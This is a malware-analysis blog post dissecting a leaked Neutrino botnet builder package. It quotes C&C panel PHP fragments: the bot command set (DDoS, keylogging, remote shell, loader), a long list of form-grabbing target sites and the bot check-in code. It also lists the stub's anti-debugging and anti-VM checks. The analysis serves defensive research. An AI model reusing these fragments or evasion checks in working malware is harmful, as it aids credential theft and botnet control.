@@ -1,0 +1,224 @@
+Inside Neutrino botnet builder
+It is common practice among cybercriminals to sell their products in the form of packages, consisting of:
+
+a malicious payload – a frontend of the malware that is used for infecting users
+a C&C panel – a backend of the malware, usually designed as a web-application, often dedicated to LAMP environment
+a builder – an application used for packing the payload and embedding in it information specific for the interest of the particular distributor (the C&C address, some configuration, etc)
+
+Such packages are commercial products sold on the black market. However, from time to time it happens that the product leaks into mainstream media. It gives researchers a precious opportunity to take a closer look on the used techniques.
+Recently, I found a leaked package containing the builder for the Neutrino botnet.  It is not the newest version (as usually the case), but it still provides lot of useful information that can help in comparative analysis with the samples that are nowadays actively distributed.
+Elements involved
+– Neutrino Builder – 32 bit PE, written in VS2013, packed with Safengine Shielden v2.3.6.0 (md5=80660973563d13dfa57748bacc4f7758)
+– panel (written in PHP)
+– stub (payload) – 32 bit PE, written in MS Visual C++ (md5=55612860c7bf1425c939815a9867b560, section .text md5=07d78519904f1e2806dda92b7c046d71)
+Functionality
+Neutrino Builder v3.9.4
+The builder has been written in Visual Studio 2013, and it requires the appropriate redistributable package to run. The provided version is cracked (as the banner states: “Cracked and coded by 0x22”).
+The functionality of this tool is very simple – it just asks a user for the C&C address and writes it inside the payload:
+
+Comparing 2 payloads – the original one, and the one edited by the Builder, we can see that changes made by the builder are really small – it simply encrypts the supplied URL and stores it in the dedicated section.
+Below: left (stub) – original payload, right (test_stub.exe) – edited payload.
+
+Panel
+
+The package contains full instructions written in Russian (readme.txt), where we can find many interesting details about the functionality (examples below).
+
+The requirements for the panel installation:
+
+PHP
+MySQL not lower than 5.6 (for the full functionality)
+
+Default login and password to the panel: admin, admin
+Tasks performed by the infected client on demand:
+
+various types of DDoS attacks
+keylogging (enable/disable), including – trace text in a defined window
+find file of the defined type
+update bot
+remove bot
+DNS spoofing (redirect address X to address Y)
+Formgrabbing, stealing FTP credentials
+download and execute a file one of the following types (EXE, DLL, bat, vbs)
+add defined entry into the Windows Registry
+
+Full list of commands sent to bot:
+
+function EncodeCommand($command)
+{
+switch (strtolower($command)) {
+case "ddos":
+return "http";
+break;
+case "https ddos":
+return "https";
+break;
+case "slowloris ddos":
+return "slow";
+break;
+case "smart http ddos":
+return "smart";
+break;
+case "download flood":
+return "dwflood";
+break;
+case "udp ddos":
+return "udp";
+break;
+case "tcp ddos":
+return "tcp";
+break;
+case "find file":
+return "findfile";
+break;
+case "cmd shell":
+return "cmd";
+break;
+case "keylogger":
+return "keylogger";
+break;
+case "spreading":
+return "spread";
+break;
+case "update":
+return "update";
+break;
+case "loader":
+return "loader";
+break;
+case "visit url":
+return "visit";
+break;
+case "bot killer":
+return "botkiller";
+break;
+case "infection":
+return "infect";
+break;
+case "dns spoofing":
+return "dns";
+break;
+}
+return "failed";
+}
+
+C&C is very sensitive for illegitimate requests and reacts by blacklisting the IP of the source:
+
+function CheckBotUserAgent($ip)
+{
+$bot_user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0";
+if ($_SERVER['HTTP_USER_AGENT'] != $bot_user_agent) {
+AddBan($ip);
+}
+if (!isset($_COOKIE['authkeys'])) {
+AddBan($ip);
+}
+$cookie_check = $_COOKIE['authkeys'];
+if ($cookie_check != "21232f297a57a5a743894a0e4a801fc3") { /* md5(admin) */
+AddBan($ip);
+}
+}
+
+Looking at install.php we can also see what are the formgrabbing targets. The list includes the most popular e-mails and social networking sites (facebook, linkedin, twitter and others).
+
+$ff_sett = "INSERT INTO `formgrabber_host` (`hostnames`, `block`) VALUES".
+"('capture_all', '.microsoft.com\r\ntiles.services.mozilla.com\r\nservices.mozilla.com\r\n.mcafee.com\r\nvs.mcafeeasap.com\r\nscan.pchealthadvisor.com\r\navg.com\r\nrrs.symantec.com\r\nsjremetrics.java.com\r\nyahoo.com/hjsal	\r\n.msg.yahoo.com\r\ngames.yahoo.com\r\n.toolbar.yahoo.com\r\nquery.yahoo.com\r\nyahoo.com/pjsal\r\neBayISAPI.dll?VISuperSize&amp;amp;amp;amp;item=\r\nbeap.bc.yahoo.com\r\n.mail.yahoo.com/ws/mail/v1/formrpc?appid=YahooMailClassic\r\n.mail.yahoo.com/dc/troubleLoading\r\n.mail.yahoo.com/mc/compose\r\nmail.yahoo.com/mc/showFolder\r\nmail.yahoo.com/mc/showMessage\r\ninstallerstats.yahoo.com\r\nlogin.yahoo.com/openid/op/start\r\nmail.yahoo.com/mc/showFolder\r\nyahoo.com/mc/showMessage\r\nmail.yahoo.com/mc/compose\r\naddress.mail.yahoo.com/yab\r\naddress.yahoo.com\r\nanalytics.yahoo.com\r\ngeo.yahoo.com\r\nnews.yahoo.com\r\nmessages.finance.yahoo.com\r\ninstallerstats.yahoo.com\r\nmail.yahoo.com/ws/\r\nmail.yahoo.com/dc/\r\nsports.yahoo.com\r\nomg.yahoo.com\r\nshine.yahoo.com\r\ndesktop.google\r\ndesign60.weatherbug.com\r\noogle.com/tbproxy/\r\noogle.com/mail/channel/\r\noogle.com/bookmarks\r\ngle-analytics.com/collect\r\nmaps.google\r\nnews.google\r\ngoogleapis.com\r\noogle.com/u/0/\r\noogle.com/u/1/\r\noogle.com/u/2/\r\noogle.com/u/3/\r\noogle.com/u/4/\r\noogle.com/a/\r\noogle.com/b/\r\nogle.com/_/n/\r\nogle.com/_/initialdata\r\noogle.com/_/photos\r\noogle.com/mail/h/\r\noogle.com/mail/u/\r\noogle.com/_/jserror\r\noogle.com/_/diagnostics\r\noogle.com/_/socialgraph\r\noogle.com/_/savetz\r\noogle.com/_/profiles\r\noogle.com/_/og/promos\r\noogle.com/analytics/web/\r\noogle.com/bind\r\noogle.com/client-channel/channel/\r\noogle.com/cloudsearch/\r\noogle.com/document/\r\noogle.com/dr\r\noogle.com/act\r\noogle.com/pref\r\noogle.com/cp\r\noogle.com/drive/\r\noogle.com/o/oauth2/\r\noogle.com/picker/\r\noogle.com/stat\r\noogle.com/spreadsheets/\r\noogle.com/uploadstats\r\noogle.com/upload/\r\noogle.com/talkgadget\r\noogle.com/translate\r\noogle.com/voice/v1/\r\noogle.com/vr\r\noogle.com/_vti_bin\r\napis.google\r\noogle.com/mail/?ui\r\noogle.com/calendar\r\nogle.com/logos/\r\noglevideo.com\r\noglesyndication.com/activeview\r\nreddit.com/api/\r\ngeo.opera.com\r\n.com/do/mail/message/\r\nhttpcs.msg.yahoo.com/\r\npnrws.skype.com/api\r\nmail.aol.com\r\ndailymotion.com/cookie/\r\netsy.com/s2/service/\r\netsy.com/api/\r\netsy.com/people/\r\netsy.com/add_favorite\r\netsy.com/search\r\nconnect.facebook.com/widgets\r\nupload.facebook.com\r\nconnect.facebook.com\r\napi.facebook.com\r\napps.facebook.com\r\ngraph.facebook.com\r\nfacebook.mafiawars.com\r\nfacebook.com/ads/\r\nfacebook.com/alite/push/log.php\r\nfacebook.com/ajax/\r\nfacebook.com/bookmark/\r\nfacebook.com/chat/\r\nfacebook.com/connect/\r\nfacebook.com/checkpoint/\r\nfacebook.com/crop_profile_pic.php\r\nfacebook.com/editnote.php\r\nfacebook.com/ego/feed/\r\nfacebook.com/dialog/\r\nfacebook.com/events/\r\nfacebook.com/friends\r\nfacebook.com/find-friends/\r\nfacebook.com/growth/\r\nfacebook.com/intl/\r\nfacebook.com/logout\r\nfacebook.com/mobile/\r\nfacebook.com/photos/\r\nfacebook.com/video/\r\nfacebook.com/plugins/\r\nfacebook.com/people/\r\nfacebook.com/privacy/selector/\r\nfacebook.com/profile/picture/\r\nfacebook.com/pubcontent/\r\nfacebook.com/requests/friends/ajax/\r\nfacebook.com/residence/\r\nfacebook.com/roadblock/\r\nfacebook.com/stickers/\r\nfacebook.com/search/live_conversation/\r\nfacebook.com/structured_suggestion/\r\nfacebook.com/timeline/\r\nfacebook.com/tr/\r\nfacebook.com/translations/\r\ninstagram.com/query/\r\ninstagram.com/client_action/\r\nflickr.com/fragment\r\nflickr.com/photo\r\nflickr.com/mail/write\r\nflickr.com/groups\r\nflickr.com/services\r\nflickr.com/people/\r\ntwitter.com/logout\r\ntwitter.com/i/\r\nlinkedin.com/lite/\r\nlinkedin.com/connections\r\nlinkedin.com/people/\r\nlinkedin.com/languageSelector\r\nlinkedin.com/home?trk\r\nlinkedin.com/wvmx/\r\nmyspace.com/beacon/\r\nmyspace.com/ajax/\r\nok.ru/app\r\nok.ru/gwtlog\r\nok.ru/?cmd\r\nok.ru/dk\r\nok.ru/feed\r\nok.ru/game\r\nok.ru/profile\r\nok.ru/push\r\nplayer.vimeo.com\r\nsgsapps.com\r\nmyfarmvillage.com\r\napi.connect.facebook.com\r\nupload.youtube.com\r\nyoutube.com/addto_ajax\r\nyoutube.com/annotations\r\nyoutube.com/api/\r\nyoutube.com/channel_ajax\r\nyoutube.com/comment_voting\r\nyoutube.com/comments_ajax\r\nyoutube.com/comment_servlet\r\nyoutube.com/inbox_ajax\r\nyoutube.com/live_stats\r\nyoutube.com/logout\r\nyoutube.com/metadata_ajax\r\nyoutube.com/playlist_video_ajax\r\nyoutube.com/subscription_ajax\r\nyoutube.com/set_awesome\r\nyoutube.com/video_info_ajax\r\nyoutube.com/video_response_upload\r\nyoutube.com/watch_actions_ajax\r\nyoutube.com/watch_fragments_ajax\r\nyoutube.com/watch_promo_ajax\r\nnetzero.net/webmail\r\nnetmail.verizon.com/netmail/driver\r\nverizon.com/webmail/driver\r\nidp.comcast.net/idp\r\noptimum.net/mail/dd\r\nwww.msn.com/?wa=wsignin1.0\r\nusers.storage.live.com/users/\r\naccount.live.com/API/\r\nmail.live.com/mail/mail.fpp\r\nmail.live.com/mail/options\r\nmail.live.com/ol/\r\nmail.live.com/Handlers/\r\nofficeapps.live.com/wv/\r\nlive.com/mail/SilverlightAttachmentUploader\r\nlive.com/c.gif\r\nlive.com/Handlers/\r\ncox.net/dashboard\r\nenhanced.charter.net\r\npost.craigslist.org\r\namazon.com/gp/history/\r\namazon.com/gp/charity/\r\namazon.com/gp/deal/\r\namazon.com/gp/gw/\r\namazon.com/gp/product/\r\namazon.com/gp/redirection/\r\namazon.com/gp/quick-abn-finder/\r\namazon.com/gp/registry/wishlist/')";
+
+$ff_hostname = "INSERT INTO `formgrabber_host` (`hostnames`) VALUES ('live,mail,paypal')";
+
+The main file used for communication with the bot is tasks.php. Only POST requests are accepted.
+Below: adding information sent by a bot into the database:
+
+if ($_SERVER["REQUEST_METHOD"] != "POST") {
+AddBan($real_ip);
+}
+
+CheckBotUserAgent($real_ip);
+CheckBan($real_ip);
+if (isset($_POST['cmd'])) {
+
+$time = time();
+$date = date('Y-m-d H:i:s');
+
+$bot_ip = $real_ip;
+$bot_os = $_POST['os'];
+$bot_name = urlencode($_POST['uid']);
+
+$bot_uid = md5($bot_os . $bot_name);
+
+$bot_time = $time;
+$bot_date = $date;
+
+$bot_av = strip_data($_POST['av']);
+$bot_version = strip_data($_POST['version']);
+$bot_quality = intval($_POST['quality']);
+
+$gi = geoip_open("GeoIP/GeoIP.dat";, GEOIP_STANDARD);
+$bot_country = geoip_country_code_by_addr($gi, $bot_ip);
+if ($bot_country == null) {
+$bot_country = "O1";
+}
+geoip_close($gi);
+
+Opening index.php causes adding client’s IP into a blacklist (unconditional):
+
+ConnectMySQL($db_host, $db_login, $db_password, $db_database);
+CheckBan($real_ip);
+AddBan($real_ip);
+
+Stub
+All the commands that can be found in the backend are reflected in the frontend. We can see it clearly, because the payload is not obfuscated!
+Hard-coded authkey, that is checked in by the C&C occurs in every request sent by the bot:
+
+Bot is registering itself to C&C, reporting its version and environment:
+
+Implementation of the commands requested by the C&C (selected examples):
+Downloading specified payload form the C&C:
+
+Keylogger (fragment)
+
+Framegrabber (fragment)
+
+Steal Clipboard content (fragment):
+
+The stolen content (i.e. logged keys) is saved in a file(logs.rar). Further, the file is read and uploaded to the C&C:
+
+Wrapping the file in a POST request:
+
+Also, success and failure of every task requested by the C&C is reported by the bot:
+
+This malware is a threat not only for a local computer. It also scans LAN searching for shared resources and steals them:
+
+Steal shared (fragment):
+
+Defensive techniques
+The payload also contains an extensive set of various defensive functions.
+In addition to the well-known checks – like isDebuggerPresent, we can find some that are less spread – like checking the user name against names used by known sandboxes: “maltest”, “tequilaboomboom”,”sandbox”, “virus”, “malware”. Full set explained below:
+
+is debugger present, via:
+IsDebuggerPresent
+is remote debugger present, via:
+CheckRemoteDebuggerPresent(GetCurrentProcess(), pDebuggerPresent)
+check if running under Wine, via:
+GetProcAddress(GetModuleHandleW(“kernel32.dll”), “wine_get_unix_file_name”)
+
+Check presence of blacklisted substrings (ignore case):
+
+username via:
+GetUserNameW vs {“MALTEST“, “TEQUILABOOMBOOM“, “SANDBOX“, “VIRUS“,”MALWARE“}
+current module name, via:
+GetModuleNameW vs {“SAMPLE“, “VIRUS“, “SANDBOX” }
+BIOS version, via registry key:
+“HARDWARE\Description\System“, value “SystemBiosVersion” against: {“VBOX“, “QEMU“, “BOCHS“}
+BIOS version, via registry key:
+“HARDWARE\Description\System“, value “VideoBiosVersion” against: “VIRTUALBOX“
+SCSI : via registry key:
+“HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id“, value “Identifier“), against {“VMWARE“, “VBOX“, “QEMU“}
+
+Check presence of:
+
+VMWareTools, via registry key: SOFTWARE\VMware, Inc.\VMware Tools
+VBoxGuestAdditions, via registry key: SOFTWARE\Oracle\VirtualBox Guest Additions
+
+Conclusion
+Malware analysts usually deal with just one piece of the puzzle from the following set – the malicious payload. Having a look at full packages, like the one described above, helps to see the bigger picture.
+It also gives a good overview on how the actions of distributing malware are coordinated. As we can see, criminals are provided with a very easy way to bootstrap their own malicious C&C. It doesn’t really require advanced technical skills to become a botnet owner. We live in age when malware is a weapon available to the masses  – that’s why it is so crucial for everyone to have a solid and layered protection.
